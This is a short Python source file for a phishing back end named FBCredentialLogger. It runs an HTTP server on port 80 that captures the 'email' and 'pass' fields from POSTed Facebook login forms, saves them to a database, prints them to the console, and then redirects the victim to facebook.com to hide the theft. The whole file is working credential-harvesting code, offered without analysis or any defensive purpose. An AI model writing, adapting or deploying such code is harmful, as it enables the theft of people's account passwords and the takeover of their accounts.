import http.server
import urllib.parse

import models

class FBCredentialLogger(http.server.BaseHTTPRequestHandler):
	def log_credentials(self):
		content_len = int(self.headers.get("Content-Length", 0))
		post_body = self.rfile.read(content_len).decode("utf8")
		query_params = urllib.parse.parse_qs(post_body)

		username = query_params["email"]
		password = query_params["pass"]

		cred = models.FacebookCredential(username=username, password=password)
		models.db.session.add(cred)

		models.db.session.commit()

		print(f"[log] recorded (username={username}, password={password})")

		self.send_response(307)
		self.send_header("Location", "https://facebook.com" + self.path)
		self.end_headers()


	def do_GET(self):
		print("GET", self.path)
		print(self.headers)

	def do_POST(self):
		self.log_credentials()


print("[log] starting credential logging server")
httpd = http.server.HTTPServer(("", 80), FBCredentialLogger)
httpd.serve_forever()
